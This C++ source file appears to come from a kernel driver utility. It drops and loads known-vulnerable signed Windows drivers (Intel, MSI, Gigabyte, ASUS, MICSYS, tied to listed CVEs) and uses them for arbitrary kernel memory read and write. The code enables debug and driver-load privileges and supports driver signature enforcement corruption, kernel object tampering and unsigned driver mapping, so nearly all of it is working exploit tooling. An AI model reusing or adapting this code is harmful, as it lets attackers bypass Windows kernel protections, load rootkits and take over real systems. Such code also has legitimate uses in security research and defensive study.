/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       KDUPROV.CPP
*
*  VERSION:     1.00
*
*  DATE:        09 Feb 2020
*
*  Vulnerable driver providers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/nal.h"
#include "idrv/rtcore.h"
#include "idrv/gdrv.h"
#include "idrv/atszio.h"
#include "idrv/msio.h"

//
// Since we have a lot of them, make an abstraction layer.
//

KDU_PROVIDER g_KDUProviders[KDU_PROVIDERS_MAX] =
{
    {
        KDU_MAX_NTBUILDNUMBER,
        IDR_iQVM64,
        0x00000000,
        (LPWSTR)L"CVE-2015-2291",
        (LPWSTR)L"NalDrv",
        (LPWSTR)L"Nal",
        (LPWSTR)L"Intel Corporation",
        (provRegisterDriver)KDUProviderStub,
        (provUnregisterDriver)KDUProviderStub,
        (provAllocateKernelVM)KDUProviderStub,
        (provFreeKernelVM)KDUProviderStub,
        NalReadVirtualMemoryEx,
        NalWriteVirtualMemoryEx,
        NalVirtualToPhysical,
        (provReadControlRegister)KDUProviderStub,
        (provQueryPML4)KDUProviderStub,
        (provReadPhysicalMemory)KDUProviderStub,
        (provWritePhysicalMemory)KDUProviderStub
    },

    {
        KDU_MAX_NTBUILDNUMBER,
        IDR_RTCORE64,
        0x00000000,
        (LPWSTR)L"CVE-2019-16098",
        (LPWSTR)L"RTCore64",
        (LPWSTR)L"RTCore64",
        (LPWSTR)L"MICRO-STAR INTERNATIONAL CO., LTD.",
        (provRegisterDriver)KDUProviderStub,
        (provUnregisterDriver)KDUProviderStub,
        (provAllocateKernelVM)KDUProviderStub,
        (provFreeKernelVM)KDUProviderStub,
        RTCoreReadVirtualMemory,
        RTCoreWriteVirtualMemory,
        (provVirtualToPhysical)KDUProviderStub,
        (provReadControlRegister)KDUProviderStub,
        (provQueryPML4)KDUProviderStub,
        (provReadPhysicalMemory)KDUProviderStub,
        (provWritePhysicalMemory)KDUProviderStub
    },

    {
        KDU_MAX_NTBUILDNUMBER,
        IDR_GDRV,
        0x00000000,
        (LPWSTR)L"CVE-2018-19320",
        (LPWSTR)L"Gdrv",
        (LPWSTR)L"GIO",
        (LPWSTR)L"Giga-Byte Technology",
        (provRegisterDriver)KDUProviderStub,
        (provUnregisterDriver)KDUProviderStub,
        (provAllocateKernelVM)KDUProviderStub,
        (provFreeKernelVM)KDUProviderStub,
        GioReadKernelVirtualMemory,
        GioWriteKernelVirtualMemory,
        GioVirtualToPhysical,
        (provReadControlRegister)KDUProviderStub,
        GioQueryPML4Value,
        GioReadPhysicalMemory,
        GioWritePhysicalMemory
    },

    {
        KDU_MAX_NTBUILDNUMBER,
        IDR_ATSZIO64,
        0x00000000,
        (LPWSTR)L"ASUSTeK WinFlash",
        (LPWSTR)L"ATSZIO",
        (LPWSTR)L"ATSZIO",
        (LPWSTR)L"ASUSTeK Computer Inc.",
        (provRegisterDriver)KDUProviderStub,
        (provUnregisterDriver)KDUProviderStub,
        (provAllocateKernelVM)KDUProviderStub,
        (provFreeKernelVM)KDUProviderStub,
        AtszioReadKernelVirtualMemory,
        AtszioWriteKernelVirtualMemory,
        AtszioVirtualToPhysical,
        (provReadControlRegister)KDUProviderStub,
        AtszioQueryPML4Value,
        AtszioReadPhysicalMemory,
        AtszioWritePhysicalMemory
    },

    {
        KDU_MAX_NTBUILDNUMBER,
        IDR_MSIO64,
        0x00000002,
        (LPWSTR)L"CVE-2019-18845",
        (LPWSTR)L"MsIo64",
        (LPWSTR)L"MsIo",
        (LPWSTR)L"MICSYS Technology Co., Ltd.",
        (provRegisterDriver)KDUProviderStub,
        (provUnregisterDriver)KDUProviderStub,
        (provAllocateKernelVM)KDUProviderStub,
        (provFreeKernelVM)KDUProviderStub,
        MsioReadKernelVirtualMemory,
        MsioWriteKernelVirtualMemory,
        MsioVirtualToPhysical,
        (provReadControlRegister)KDUProviderStub,
        MsioQueryPML4Value,
        MsioReadPhysicalMemory,
        MsioWritePhysicalMemory
    }

};

/*
* KDUProvList
*
* Purpose:
*
* Output available providers.
*
*/
VOID KDUProvList()
{
    KDU_PROVIDER* prov;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    for (ULONG i = 0; i < KDU_PROVIDERS_MAX; i++) {
        prov = &g_KDUProviders[i];

        printf_s("Provider # %lu\r\n\t%ws, DriverName \"%ws\", DeviceName \"%ws\"\r\n",
            i,
            prov->Desciption,
            prov->DriverName,
            prov->DeviceName);

        //
        // Show signer.
        //
        printf_s("\tSigned by: \"%ws\"\r\n",
            prov->SignerName);

        //
        // List provider flags.
        //
        printf_s("\tHVCI support: %s\r\n"\
            "\tWHQL signature present: %s\r\n",
            (prov->SupportHVCI == 0) ? "No" : "Yes",
            (prov->SignatureWHQL == 0) ? "No" : "Yes");

        //
        // Maximum support Windows build.
        //
        if (prov->MaxNtBuildNumberSupport == KDU_MAX_NTBUILDNUMBER) {
            printf_s("\tMaximum Windows build undefined, no restrictions\r\n");
        }
        else {
            printf_s("\tMaximum supported Windows build: 0x%lX\r\n",
                prov->MaxNtBuildNumberSupport);
        }

    }

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);
}

/*
* KDUProvStartVulnerableDriver
*
* Purpose:
*
* Load vulnerable driver and return handle for it device or NULL in case of error.
*
*/
HANDLE KDUProvStartVulnerableDriver(
    _In_ ULONG uResourceId,
    _In_ HINSTANCE hInstance,
    _In_ LPWSTR lpDriverName,
    _In_ LPWSTR lpDeviceName,
    _In_ LPWSTR lpFullFileName
)
{
    BOOL     bLoaded = FALSE;
    PBYTE    drvBuffer;
    NTSTATUS ntStatus;
    ULONG    resourceSize = 0, writeBytes;
    HANDLE   deviceHandle = NULL;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {
        printf_s("[!] Vulnerable driver already loaded\r\n");
        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //

        drvBuffer = supQueryResourceData(uResourceId, hInstance, &resourceSize);
        if (drvBuffer == NULL) {
            printf_s("[!] Driver resource id not found %lu\r\n", uResourceId);
            return NULL;
        }

        printf_s("[+] Extracting vulnerable driver as \"%ws\"\r\n", lpFullFileName);

        writeBytes = (ULONG)supWriteBufferToFile(lpFullFileName,
            drvBuffer,
            resourceSize,
            TRUE,
            FALSE,
            &ntStatus);

        supHeapFree(drvBuffer);

        if (resourceSize != writeBytes) {
            printf_s("[!] Unable to extract vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
            return NULL;
        }

        ntStatus = supLoadDriver(lpDriverName, lpFullFileName, FALSE);
        if (NT_SUCCESS(ntStatus)) {
            printf_s("[+] Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);
            bLoaded = TRUE;
        }
        else {
            printf_s("[!] Unable to load vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
            DeleteFile(lpFullFileName);
        }
    }

    if (bLoaded) {
        ntStatus = supOpenDriver(lpDeviceName, &deviceHandle);
        if (!NT_SUCCESS(ntStatus))
            printf_s("[!] Unable to open vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
        else
            printf_s("[+] Vulnerable driver opened\r\n");
    }
    return deviceHandle;
}

/*
* KDUProvStopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver.
*
*/
void KDUProvStopVulnerableDriver(
    _In_ LPWSTR lpDriverName,
    _In_ LPWSTR lpFullFileName
)
{
    NTSTATUS ntStatus;

    ntStatus = supUnloadDriver(lpDriverName, TRUE);
    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] Unable to unload vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
    }
    else {

        printf_s("[+] Vulnerable driver unloaded\r\n");
        ULONG retryCount = 3;

        do {
            Sleep(1000);
            if (DeleteFile(lpFullFileName)) {
                printf_s("[+] Vulnerable driver file removed\r\n");
                break;
            }

            retryCount--;

        } while (retryCount);

    }
}

/*
* KDUVirtualToPhysical
*
* Purpose:
*
* Provider wrapper for VirtualToPhysical routine.
*
*/
BOOL WINAPI KDUVirtualToPhysical(
    _In_ KDU_CONTEXT* Context,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    KDU_PROVIDER* prov = Context->Provider;

    //
    // Bypass provider implementation and call PwVirtualToPhysical directly.
    // However some samples may want it own preparations (provider #6), so comment this out.
    //
    /*return PwVirtualToPhysical(Context->DeviceHandle,
        (provQueryPML4Value)prov->Callbacks.QueryPML4Value,
        (provReadPhysicalMemory)prov->Callbacks.ReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);*/

    return prov->Callbacks.VirtualToPhysical(Context->DeviceHandle,
        VirtualAddress,
        PhysicalAddress);
}

/*
* KDUReadKernelVM
*
* Purpose:
*
* Provider wrapper for ReadKernelVM routine.
*
*/
_Success_(return != FALSE)
BOOL WINAPI KDUReadKernelVM(
    _In_ KDU_CONTEXT * Context,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    KDU_PROVIDER* prov = Context->Provider;

    if (Address < Context->MaximumUserModeAddress) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    //
    // Some providers under several conditions may crash here without bugcheck.
    //
    __try {

        bResult = prov->Callbacks.ReadKernelVM(Context->DeviceHandle,
            Address,
            Buffer,
            NumberOfBytes);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetLastError(GetExceptionCode());
        return FALSE;
    }
    return bResult;
}

/*
* KDUWriteKernelVM
*
* Purpose:
*
* Provider wrapper for WriteKernelVM routine.
*
*/
_Success_(return != FALSE)
BOOL WINAPI KDUWriteKernelVM(
    _In_ KDU_CONTEXT * Context,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    KDU_PROVIDER* prov = Context->Provider;

    if (Address < Context->MaximumUserModeAddress) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    //
    // Some providers under several conditions may crash here without bugcheck.
    //
    __try {

        bResult = prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
            Address,
            Buffer,
            NumberOfBytes);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetLastError(GetExceptionCode());
        return FALSE;
    }
    return bResult;
}

/*
* KDUProviderStub
*
* Purpose:
*
* Stub routine.
*
*/
BOOL WINAPI KDUProviderStub(
    VOID)
{
    SetLastError(ERROR_UNSUPPORTED_TYPE);
    return FALSE;
}

/*
* KDUProviderCreate
*
* Purpose:
*
* Create Provider to work with it.
*
*/
PKDU_CONTEXT WINAPI KDUProviderCreate(
    _In_ ULONG ProviderId,
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ HINSTANCE ModuleBase,
    _In_ KDU_ACTION_TYPE ActionType
)
{
    if (ProviderId >= KDU_PROVIDERS_MAX)
        ProviderId = KDU_PROVIDER_DEFAULT;

    KDU_PROVIDER* prov = &g_KDUProviders[ProviderId];

    //
    // Show provider info.
    //
    printf_s("[>] Entering %s\r\n", __FUNCTION__);
    printf_s("[+] Provider: Desciption %ws, Name \"%ws\"\r\n",
        prov->Desciption,
        prov->DriverName);

    //
    // Check HVCI support.
    //
    if (HvciEnabled && prov->SupportHVCI == 0) {
        printf_s("[!] Abort: selected provider does not support HVCI\r\n");
        return NULL;
    }

    //
    // Check current Windows NT build number.
    //
    if (prov->MaxNtBuildNumberSupport != KDU_MAX_NTBUILDNUMBER) {
        if (NtBuildNumber > prov->MaxNtBuildNumberSupport) {
            printf_s("[!] Abort: selected provider does not support this Windows NT build\r\n");
            return NULL;
        }
    }

    //
    // Verify key provider functionality.
    //
    switch (ActionType) {

    case ActionTypeDKOM:
    case ActionTypeMapDriver:

        //
        // Check if we can read/write.
        //
        if ((PVOID)prov->Callbacks.ReadKernelVM == (PVOID)KDUProviderStub ||
            (PVOID)prov->Callbacks.WriteKernelVM == (PVOID)KDUProviderStub)
        {
            printf_s("[!] Abort: selected provider does not support arbitrary kernel read/write or\r\n"\
                "\tKDU interface is not implemented for these methods.\r\n");

#ifndef _DEBUG
            return NULL;
#endif
        }
        break;

    case ActionTypeDSECorruption:

        //
        // Check if we can write.
        //
        if ((PVOID)prov->Callbacks.WriteKernelVM == (PVOID)KDUProviderStub) {

            printf_s("[!] Abort: selected provider does not support arbitrary kernel write.\r\n");


#ifndef _DEBUG
            return NULL;
#endif

    }
        break;

    default:
        break;
}

    NTSTATUS ntStatus;

    ntStatus = supEnablePrivilege(SE_DEBUG_PRIVILEGE, TRUE);
    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] Abort: SeDebugPrivilege is not assigned! NTSTATUS (0x%lX)\r\n", ntStatus);
        return NULL;
    }

    ntStatus = supEnablePrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] Abort: SeLoadDriverPrivilege is not assigned! NTSTATUS (0x%lX)\r\n", ntStatus);
        return NULL;
    }

    //
    // Allocate KDU_CONTEXT structure and fill it with data.
    //
    KDU_CONTEXT* Context = (KDU_CONTEXT*)supHeapAlloc(sizeof(KDU_CONTEXT));
    if (Context == NULL)
        return NULL;

    Context->Provider = &g_KDUProviders[ProviderId];
    Context->ModuleBase = ModuleBase;
    Context->NtOsBase = supGetNtOsBase();

    PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
    SIZE_T length = 64 +
        (_strlen(Context->Provider->DriverName) * sizeof(WCHAR)) +
        CurrentDirectory->Length;

    Context->NtBuildNumber = NtBuildNumber;
    Context->DriverFileName = (LPWSTR)supHeapAlloc(length);
    Context->MaximumUserModeAddress = supQueryMaximumUserModeAddress();

    if (Context->DriverFileName == NULL) {
        supHeapFree(Context);
        Context = NULL;
    }
    else {

        length = CurrentDirectory->Length / sizeof(WCHAR);

        _strncpy(Context->DriverFileName,
            length,
            CurrentDirectory->Buffer,
            length);

        _strcat(Context->DriverFileName, TEXT("\\"));
        _strcat(Context->DriverFileName, Context->Provider->DriverName);
        _strcat(Context->DriverFileName, TEXT(".sys"));

        HANDLE deviceHandle = KDUProvStartVulnerableDriver(Context->Provider->ResourceId,
            Context->ModuleBase,
            Context->Provider->DriverName,
            Context->Provider->DeviceName,
            Context->DriverFileName);

        if (deviceHandle) {
            Context->DeviceHandle = deviceHandle;

            //
            // Register (unlock, send love letter, whatever this provider want first) driver.
            //
            if ((PVOID)Context->Provider->Callbacks.RegisterDriver != (PVOID)KDUProviderStub) {

                if (!Context->Provider->Callbacks.RegisterDriver(deviceHandle))
                    printf_s("[!] Coult not register driver, GetLastError %lu\r\n", GetLastError());
            }

        }
        else {
            supHeapFree(Context->DriverFileName);
            supHeapFree(Context);
            Context = NULL;
        }

    }

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return Context;
}

/*
* KDUProviderRelease
*
* Purpose:
*
* Reelease Provider context, free resources and unload driver.
*
*/
VOID WINAPI KDUProviderRelease(
    _In_ KDU_CONTEXT * Context)
{
    if (Context) {

        //
        // Unregister driver if supported.
        //
        if ((PVOID)Context->Provider->Callbacks.UnregisterDriver != (PVOID)KDUProviderStub) {
            Context->Provider->Callbacks.UnregisterDriver(Context->DeviceHandle);
        }

        if (Context->DeviceHandle)
            NtClose(Context->DeviceHandle);

        //
        // Unload driver.
        //
        KDUProvStopVulnerableDriver(Context->Provider->DriverName,
            Context->DriverFileName);

        if (Context->DriverFileName)
            supHeapFree(Context->DriverFileName);
    }
}
